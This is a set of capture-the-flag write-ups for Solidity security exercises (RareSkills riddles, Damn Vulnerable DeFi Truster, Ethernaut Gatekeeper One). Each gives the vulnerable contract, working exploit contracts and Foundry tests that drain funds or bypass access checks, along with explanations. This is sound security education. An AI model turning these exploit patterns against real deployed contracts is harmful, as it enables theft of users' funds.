# CTF Write Ups 2

## RareSkills Solidity Riddles: Forwarder
Link: https://github.com/RareSkills/solidity-riddles/blob/main/contracts/Forwarder.sol

### Contracts
- `src/Week10-11/Forwarder.sol`
```
contract Wallet {
    address public immutable forwarder;

    constructor(address _forwarder) payable {
        require(msg.value == 1 ether);
        forwarder = _forwarder;
    }

    function sendEther(address destination, uint256 amount) public {
        require(msg.sender == forwarder, "sender must be forwarder contract");
        (bool success,) = destination.call{value: amount}("");
        require(success, "failed");
    }
}

contract Forwarder {
    function functionCall(address a, bytes calldata data) public {
        (bool success,) = a.call(data);
        require(success, "forward failed");
    }
}
```
- `test/Week10-11/Forwarder.t.sol`
```
contract ForwarderTest is Test {
    address attackerWallet;
    uint256 attackerWalletBalanceBefore;
    Forwarder forwarderContract;
    Wallet walletContract;

    function setUp() public {
        attackerWallet = address(0xdead);
        forwarderContract = new Forwarder();
        walletContract = (new Wallet){value: 1 ether}(address(forwarderContract));
        attackerWalletBalanceBefore = attackerWallet.balance;
    }

    function testExploit() public {
        bytes memory data = abi.encodeWithSignature("sendEther(address,uint256)", attackerWallet, 1 ether);
        forwarderContract.functionCall(address(walletContract), data);

        _checkSolved();
    }

    function _checkSolved() internal {
        uint256 attackerWalletBalanceAfter = attackerWallet.balance;
        assertApproxEqAbs(
            attackerWalletBalanceAfter - attackerWalletBalanceBefore,
            1 ether,
            1000000000000000 //delta = 0.001
        );
        uint256 walletContractBalance = address(walletContract).balance;
        assertEq(walletContractBalance, 0);
    }
}
```

### Exploit
Cracking this exploit requires knowing how `.call` and `abi.encodeWithSignature` works. But simply, `call` is a low level function used to interact with another contract; and `abi.encodeWithSignature` is used to encode function calls including the function signature and its arguments. The latter returns a bytes array representing an encoded function call that can be used to make a call to another contract's function with the encoded arguments.

Since `sendEther` in `Wallet` can only be called by the `Forwarder`, and `functionCall` in `Forwarder` takes in an arbitrary `data` input which is passed to `call`, we can easily get the `Wallet` contract to send its balance to the attackers wallet by passing in the following as `data``:
```
    bytes memory data = abi.encodeWithSignature("sendEther(address,uint256)", attackerWallet, 1 ether);
    forwarderContract.functionCall(address(walletContract), data);
```
The first line constructs the encoded `sendEther` function call with the attacker's wallet as the destination and 1 ether as the amount to send. When this is passed to `functionCall`, the `Forwarder` contract sends a call to `walletContract` to execute the encoded function call. Thus transfering out the balance to the attacker.

## RareSkills Solidity Riddles: Overmint3
Link: https://github.com/RareSkills/solidity-riddles/blob/main/contracts/Overmint3.sol

### Contracts
- `src/Week10-11/Overmint3.sol`
```
contract Overmint3 is ERC721 {
    using Address for address;

    mapping(address => uint256) public amountMinted;
    uint256 public totalSupply;

    constructor() ERC721("Overmint3", "AT") {}

    function mint() external {
        require(!isContract(msg.sender), "no contracts");
        require(amountMinted[msg.sender] < 1, "only 1 NFT");
        totalSupply++;
        _safeMint(msg.sender, totalSupply);
        amountMinted[msg.sender]++;
    }

    //`isContract()` has been removed from OpenZeppelin's `Address` library in V5
    function isContract(address _addr) public view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(_addr)
        }
        return size > 0;
    }
}

contract Exploit {
    Overmint3 public overmint3Contract;
    address public attackerWallet;

    constructor(Overmint3 _overmint3Contract, address _attackerWallet) {
        overmint3Contract = _overmint3Contract;
        attackerWallet = _attackerWallet;
        new ExploitMedium(overmint3Contract, this);
        new ExploitMedium(overmint3Contract, this);
        new ExploitMedium(overmint3Contract, this);
        new ExploitMedium(overmint3Contract, this);
        new ExploitMedium(overmint3Contract, this);
    }

    function retrieve() public payable {
        uint256 balance = overmint3Contract.totalSupply();
        for (uint256 i = 1; i <= balance; i++) {
            overmint3Contract.transferFrom(address(this), attackerWallet, i);
        }
    }
}

contract ExploitMedium {
    Overmint3 public overmint3Contract;
    Exploit public exploitContract;

    constructor(Overmint3 _overmint3Contract, Exploit _exploitContract) {
        overmint3Contract = _overmint3Contract;
        exploitContract = _exploitContract;
        overmint3Contract.mint();
        uint256 tokenId = overmint3Contract.totalSupply();
        overmint3Contract.transferFrom(address(this), address(exploitContract), tokenId);
    }
}
```
- `test/Week10-11/Overmint3.t.sol`
```
contract Overmint3Test is Test {
    Overmint3 overmint3Contract;
    address attackerWallet;
    Exploit exploitContract;

    function setUp() public {
        overmint3Contract = new Overmint3();
        attackerWallet = address(0xbad);
        exploitContract = new Exploit(overmint3Contract, attackerWallet);
    }

    function testExploit() public {
        vm.startPrank(attackerWallet);
        exploitContract.retrieve();
        vm.stopPrank();
        _checkSolved();
    }

    function _checkSolved() internal {
        assertEq(overmint3Contract.balanceOf(attackerWallet), 5);
        assertTrue(vm.getNonce(address(attackerWallet)) <= 1, "must exploit in one transaction");
    }
}
```

### Exploit
The exploit requires understanding that when a function call is made from the constructor of a contract, `extcodesize` of the msg.sender will be `0` since the contract code is only stored at the end of the constructor execution. So this will bypass the `isContract` check in the `mint` function when its called from another contract's constructor.

One might be tempted to use the `onERC721Received` hook in `IERC721Receiver` to try to reenter the mint function to continuously mint NFTs in a single call, but this attack vector will fail. The reason is because if our attack was initiated in the constructor, then there will be no `onERC721Received` hook in the attacking contract available to be called yet since the constructor has not competed its execution. This would only allow 1 NFT to be minted to the attacking contract.

Instead, we could deploy 5 secondary attack contracts that solely exists to call `mint` once in each of their constructors, and then transfer the minted NFT to the primary attacking contract (or to `attackerWallet` for the matter). The primary attacking contract only needs to create 5 instances of the secondary attaking contract in its constructor, and these secondary attacking contracts will then mint and transfer an NFT to the primary contract within their constructor. At the end of the contract deployments, `attackerWallet` just has to call `retrieve` on `Exploit` to transfer out all minted NFTs.

## RareSkills Solidity Riddles: Democracy
Link: https://github.com/RareSkills/solidity-riddles/blob/main/contracts/Democracy.sol

### Contracts
- `src/Week10-11/Democracy.sol` (Note that this is updated slightly: L103 - 126, for compatibility with OpenZeppelin V5)
```
contract Democracy is Ownable, ERC721 {
    uint256 public PRICE = 1_000 ether;
    uint256 public TOTAL_SUPPLY_CAP = 10;

    address public incumbent;
    address public challenger;
    mapping(address => bool) public voted;
    mapping(address => uint256) public votes;
    bool public electionCalled = false;

    modifier electionNotYetCalled() {
        require(!electionCalled, "DemocracyNft: Election has ended");
        _;
    }

    modifier contractBalanceIsGreaterThanZero() {
        require(address(this).balance > 0, "DemocracyNft: Insufficient contract balance");
        _;
    }

    modifier nomineeIsValid(address nominee) {
        require(nominee == incumbent || nominee == challenger, "DemocracyNft: Must vote for incumbent or challenger");
        _;
    }

    modifier hodlerNotYetVoted() {
        require(!voted[msg.sender], "DemocracyNft: One hodler, one vote");
        _;
    }

    modifier callerIsNotAContract() {
        require(tx.origin == msg.sender, "DemocracyNft: Feature available to EOAs only");
        _;
    }

    constructor() payable ERC721("Democracy NFT", "DMRCY") Ownable(msg.sender) {
        incumbent = owner();
    }

    function nominateChallenger(address challenger_) external {
        require(challenger == address(0), "DemocracyNft: Challenger already nominated");

        challenger = challenger_;

        // Rig the election!
        _rigElection();
    }

    function vote(address nominee)
        external
        contractBalanceIsGreaterThanZero
        electionNotYetCalled
        nomineeIsValid(nominee)
        hodlerNotYetVoted
    {
        // Check NFT balance
        uint256 hodlerNftBalance = balanceOf(msg.sender);
        require(hodlerNftBalance > 0, "DemocracyNft: Voting only for NFT hodlers");

        // Log votes
        votes[nominee] += hodlerNftBalance;
        voted[msg.sender] = true;

        // Tip hodler for doing their civic duty
        payable(msg.sender).call{value: address(this).balance / 10}("");

        // Once all hodlers have voted, call election
        if (votes[incumbent] + votes[challenger] >= TOTAL_SUPPLY_CAP) {
            _callElection();
        }
    }

    function mint(address to, uint256 tokenId) external payable callerIsNotAContract onlyOwner {
        require(msg.value >= PRICE, "DemocracyNft: Insufficient transaction value");

        _mint(to, tokenId);
    }

    //Updated slighlty for compatibility with OZ v5
    //----------------------------------------------------
    function approve(address to, uint256 tokenId) public override callerIsNotAContract {
        _approve(to, tokenId, _msgSender());
    }

    // function transferFrom(address from, address to, uint256 tokenId) public override callerIsNotAContract {
    //     require(_isAuthorized(ownerOf(tokenId), _msgSender(), tokenId), "ERC721: caller is not token owner or approved");

    //     _transfer(from, to, tokenId);
    // }

    // function safeTransferFrom(
    //     address from,
    //     address to,
    //     uint256 tokenId,
    //     bytes memory
    // )
    //     public
    //     override
    //     callerIsNotAContract
    // {
    //     require(_isAuthorized(ownerOf(tokenId), _msgSender(), tokenId), "ERC721: caller is not token owner or approved");

    //     _safeTransfer(from, to, tokenId, "");
    // }
    //----------------------------------------------------

    function withdrawToAddress(address address_) external onlyOwner {
        payable(address_).call{value: address(this).balance}("");
    }

    function _callElection() private {
        electionCalled = true;

        if (votes[challenger] > votes[incumbent]) {
            incumbent = challenger;
            _transferOwnership(challenger);

            challenger = address(0);
        }
    }

    function _rigElection() private {
        // Mint voting tokens to challenger
        _mint(challenger, 0);
        _mint(challenger, 1);

        // Make it look like a close election...
        votes[incumbent] = 5;
        votes[challenger] = 3;
    }
}

contract ExploitInitial is IERC721Receiver {
    Democracy democracyContract;
    address challenger;
    ExploitFinal exploitFinalContract;

    constructor(Democracy _democracyContract, address _challenger, ExploitFinal _exploitFinalContract) {
        democracyContract = _democracyContract;
        challenger = _challenger;
        exploitFinalContract = _exploitFinalContract;
    }

    receive() external payable {
        democracyContract.safeTransferFrom(address(this), address(exploitFinalContract), 1);
    }

    function attack() public {
        democracyContract.vote(challenger);
    }

    function onERC721Received(
        address, /*operator*/
        address, /*from*/
        uint256, /*tokenId*/
        bytes calldata /*data*/
    )
        external
        returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }
}

contract ExploitFinal is IERC721Receiver {
    Democracy democracyContract;
    address challenger;

    constructor(Democracy _democracyContract, address _challenger) {
        democracyContract = _democracyContract;
        challenger = _challenger;
    }

    receive() external payable {}

    function onERC721Received(
        address, /*operator*/
        address, /*from*/
        uint256, /*tokenId*/
        bytes calldata /*data*/
    )
        external
        returns (bytes4)
    {
        democracyContract.vote(challenger);
        return IERC721Receiver.onERC721Received.selector;
    }
}
```
- `test/Week10-11/Democracy.t.sol`
```
contract DemocracyTest is Test {
    Democracy democracyContract;
    address owner;
    address attackerWallet;

    ExploitInitial exploitInitialContract;
    ExploitFinal exploitFinalContract;

    function setUp() public {
        democracyContract = new Democracy{value: 1 ether}();
        owner = address(0xdead);
        attackerWallet = address(0xbad);

        exploitFinalContract = new ExploitFinal(democracyContract, attackerWallet);
        exploitInitialContract = new ExploitInitial(democracyContract, attackerWallet, exploitFinalContract);
    }

    function testExploit() public {
        democracyContract.nominateChallenger(attackerWallet);
        assertEq(democracyContract.balanceOf(attackerWallet), 2);

        vm.startPrank(attackerWallet);
        democracyContract.safeTransferFrom(attackerWallet, address(exploitInitialContract), 1);
        democracyContract.vote(attackerWallet);

        exploitInitialContract.attack();
        democracyContract.withdrawToAddress(attackerWallet);
        vm.stopPrank();

        _checkSolved();
    }

    function _checkSolved() internal {
        assertEq(address(democracyContract).balance, 0);
    }
}
```

### Exploit
In the `Democracy` contract, there is no stopping `challenger` from voting for themselves. Realistically, this should be prohibited, and if that's the case, a Factory pattern should be used for the exploit. That is, we should have a Factory contract that can be called to create Attack contracts, and within each Attack contract, it should have some logic for voting once, and then creating another Attack contract and transfering an NFT to that newly created attack contract so that it can also vote, all in a single function call - so this recursive calling workflow should be used in the `receive` function.

In this exploit, it will be taken that `challenger` can vote for themselves.

When `nominateChallenger` is called, two NFT tokens are minted to the challenger. However, since the election is rigged, the votes will be set to `incumbent (I) = 5`, and `challenger (C) = 3`. Note that in the `vote` function, once the total votes sums up to `10`, the elections will be ended, and the winner of the election will be the new owner of the contract, who can then withdraw the balance. For each `vote`, the number of votes is incremented by the NFT balance of `msg.sender`, thus if the challenger calls `vote` right away, the election will end at `5(I), 5(C)`, and the challenger will lose since in order for the challenger to win, they need more votes than the incumbent.

To complete the exploit, the challenger calls `safeTransferFrom` to transfer one NFT to the first attacking contract: `ExploitInitial`. The challenger can then vote for themselves and this will only increase the vote to `5(I), 4(C)` since the challenger is only holding one NFT. 

The challenger calls `attack` from `ExploitInitial`, which in turn calls a `vote` for the challenger. This will increase the vote to `5(I), 5(C)` since `ExploitInitial` has one NFT from the challenger. The vote function in `Democracy` sends some Ether to msg.sender when they cast a vote, and `ExploitInitial` has a `receive` function that will call `safeTransferFrom` to transfer an NFT from `ExploitInitial` to `ExploitFinal`. As `ExploitInitial` receives Ether from `Democracy`, it will then transfer it's NFT to `ExploitFinal`; and in `ExploitFinal`, `onERC721Received` will call another `vote` for challenger, thereby increasing the vote to `5(I), 6(C)`. The execution flow stops, and the election will end since the total votes is more than `10`. Now the challenger will have more votes than the incumbent and they can then withdraw the balance from `Democracy`.


## Damn Vulnerable DeFi (Foundry): Truster
Link: https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v3.0.0/contracts/truster

### Contracts
- `src/Week10-11/TrusterLenderPool.sol`
```
contract TrusterLenderPool is ReentrancyGuard {
    using Address for address;

    DamnValuableToken public immutable token;

    error RepayFailed();

    constructor(DamnValuableToken _token) {
        token = _token;
    }

    function flashLoan(
        uint256 amount,
        address borrower,
        address target,
        bytes calldata data
    )
        external
        nonReentrant
        returns (bool)
    {
        uint256 balanceBefore = token.balanceOf(address(this));

        token.transfer(borrower, amount);
        target.functionCall(data);

        if (token.balanceOf(address(this)) < balanceBefore) {
            revert RepayFailed();
        }

        return true;
    }
}

contract Exploit {
    TrusterLenderPool public trusterLenderPool;
    DamnValuableToken public dvt; //ERC20-like

    constructor(TrusterLenderPool _trusterLenderPool, DamnValuableToken _dvt) {
        trusterLenderPool = _trusterLenderPool;
        dvt = _dvt;
    }

    function exploit() public {
        uint256 approveAmount = 1_000_000 ether;
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), approveAmount);
        trusterLenderPool.flashLoan(0 ether, address(this), address(dvt), data);
        dvt.transferFrom(address(trusterLenderPool), msg.sender, approveAmount);
    }
}
```
- `test/Week10-11/TrusterLenderPool.t.sol`
```
contract TrusterLenderPoolTest is Test {
    TrusterLenderPool pool;
    DamnValuableToken token;
    Exploit exploitContract;
    address deployer;
    address player;

    function setUp() public {
        token = new DamnValuableToken();
        pool = new TrusterLenderPool(token);
        assertEq(address(pool.token()), address(token));

        token.transfer(address(pool), 1_000_000 * 10 ** 18);
        assertEq(token.balanceOf(address(pool)), 1_000_000 * 10 ** 18);
        assertEq(token.balanceOf(player), 0);

        exploitContract = new Exploit(pool, token);
    }

    function testExploit() public {
        vm.startPrank(player);
        exploitContract.exploit();
        _checkSolved();
    }

    function _checkSolved() internal {
        assertEq(token.balanceOf(player), 1_000_000 * 10 ** 18);
        assertEq(token.balanceOf(address(pool)), 0);
    }
}
```

### Exploit
In the `flashLoan` function, `target` does not have any restriction on the addresses we can use, and so an external call can be made in the line: `target.functionCall(data)`, in which arbitrary data can be called on an arbitrary contract. In other words, we can call any function on any contract that we pass as `target` and `data`. Thus, we can encode an `approve` on the token contract to allow `Exploit` to transfer tokens from `TrusterLenderPool` to `player` who will be the msg.sender.

In the `exploit` function, we encode the approve call to allow `Exploit` to move `TrusterLenderPool`'s DVT balance as `abi.encodeWithSignature("approve(address,uint256)", address(this), approveAmount);` where `address(this) == address(Exploit)` and `approveAmount == 1_000_000 ether`. When we call the `flashLoan` function, we have to pass in `amount = 0` so that we can avoid triggering the `RepayFailed` revert. The encoded function call will then be sent to the DVT contract to approve `Exploit` to call `transferFrom` on `TrusterLenderPool`. And after that, we can just transfer DVT tokens from the pool contract to `player`.

## Ethernaut: #13 Gatekeeper 1
Link: https://ethernaut.openzeppelin.com/level/0xb5858B8EDE0030e46C0Ac1aaAedea8Fb71EF423C

### Contracts
- `src/Week10-11/GateKeeperOne.sol`
```
contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract Exploit {
    GatekeeperOne public gateKeeperOne;
    address public player;

    constructor(GatekeeperOne _gateKeeperOne, address _player) {
        gateKeeperOne = _gateKeeperOne;
        player = _player;
    }

    function attack() public {
        bytes8 gateKey = bytes8(uint64(uint160(player))) & 0xFFFFFFFF0000FFFF;
        for (uint256 i = 0; i <= 8191;) {
            try gateKeeperOne.enter{gas: 85000 + i}(gateKey) {
                break;
            } catch {
                i++;
            }
        }
    }
}
```
- `test/Weel10-11/GateKeeperOne.t.sol`
```
contract GatekeeperOneTest is Test {
    GatekeeperOne gateKeeperOne;
    address player;
    Exploit exploitContract;

    function setUp() public {
        gateKeeperOne = new GatekeeperOne();
        player = tx.origin;
        exploitContract = new Exploit(gateKeeperOne, player);
    }

    function testExploit() public {
        vm.startPrank(player);
        exploitContract.attack();
        assertEq(gateKeeperOne.entrant(), player);
    }
}
```

### Exploit
#### Gate One:
In `require(msg.sender != tx.origin)`; basically, we just need to call `GatekeeperOne.enter()` from a contract, so that
`tx.origin` is the EOA address, and `msg.sender` is the contract address.

#### Gate Two:
In `require(gasleft() % 8191 == 0)` we need to call `GatekeeperOne.enter()` with a gas amount that is a multiple of 8191.
The `gasleft` function is a global function that returns the remaining gas amount in the current transaction, after executing all the opcodes. So we need to call the function with a specific amount of gas such that it will make the `gasleft() % 8191 == 0` condition true. It's difficult to guess the precise amount of gas, but we can brute force it. The gas used by the `enter` function must be at least 8191 + all the gas needed to execute the opcodes, so we can use a loop with a try-catch and a starting base amount of gas (to prevent out of gas revert) and keep incrementing it until it works.

#### Gate Three:
#### First requirement:
The first requirement: `uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))`. The right side only takes the least significant 16 bits (2 bytes) of _gateKey, and the left side takes the least significant 32 bits (4 bytes) of _gateKey. But we need to make sure that the 2 bytes on the right side are the same as the 2 least significant bytes on the left. Thus we have to remove the 2 most significant bytes on the left with a bitmask. So for example, to make `0x12345678' equal to `0x00005678`, we can execute `0x12345678 & 0x0000FFFF`. This will make the left side equal to the right side with the mask of `0x0000FFFF`.

The second requirement: `uint32(uint64(_gateKey)) != uint64(_gateKey)`. The right side will take the least significant 64 bits (8 bytes) of _gateKey, and the left side will take the least significant 32 bits (4 bytes) of _gateKey. Here we need to maintain the first requirement, and also ensure that if a mask is applied here, the value on both sides will be different.
Using the mask from the first requirement will not work here, because the left side will be equal to the right side.
So considering that the left only takes the least significant 4 bytes, and the right take the least significant 8 bytes,
we just need to also preserve the most significant 4 bytes on the value on the right side. Thus, we can use a mask of
`0xFFFFFFFF0000FFFF` which builds on top of the first mask. So if _gateKey was `0x1234567812345678`, applying this mask: `0x1234567812345678 & 0xFFFFFFFF0000FFFF` will make it `0x1234567800005678`. So this will make the left side `0x00005678` and the right side will remain as `0x1234567800005678`.

The third requirement: `uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))`. The right side will take the least
significant 2 bytes of `tx.origin`, and the left side will take the least significant 4 bytes of `_gateKey`. We just need to
apply the `0xFFFFFFFF0000FFFF` mask to the address of `tx.origin` (the `player`) converted to a `bytes8` type. To covert an
address to a bytes8 type, we just need to cast it appropriately (an `address` is a 20 bytes type): address -> uint160 ->
uint64 -> bytes8. This would be: `bytes8(uint64(uint160(address(player)))) & 0xFFFFFFFF0000FFFF`.

Keep in mind that bytes types are left aligned, and numeric types are right aligned. Something like casting bytes8 to uint64 is akin to converting the bytes8 value to a uint64 value, and vice versa.
```
address(0x9AebA12E57837B35cb322E857A8114792248f1B9) -> 
0x9AebA12E57837B35cb322E857A8114792248f1B9

uint160(address(0x9AebA12E57837B35cb322E857A8114792248f1B9)) -> 0x0000000000000000000000009aeba12e57837b35cb322e857a8114792248f1b9

uint64(uint160(address(0x9AebA12E57837B35cb322E857A8114792248f1B9))) -> 0x0000000000000000000000000000000000000000000000007a8114792248f1b9

bytes8(uint64(uint160(address(0x9AebA12E57837B35cb322E857A8114792248f1B9)))) -> 
0x7a8114792248f1b9

0x7a8114792248f1b9 & 0xFFFFFFFF0000FFFF ->
0x7a8114790000f1b9

uint64(0x7a8114790000f1b9) ->                                           0x0000000000000000000000000000000000000000000000007a8114790000f1b9

uint32(uint64(0x7a8114790000f1b9)) ->                                   0x000000000000000000000000000000000000000000000000000000000000f1b9

uint16(uint160(0x9AebA12E57837B35cb322E857A8114792248f1B9)) ->          0x000000000000000000000000000000000000000000000000000000000000f1b9
```
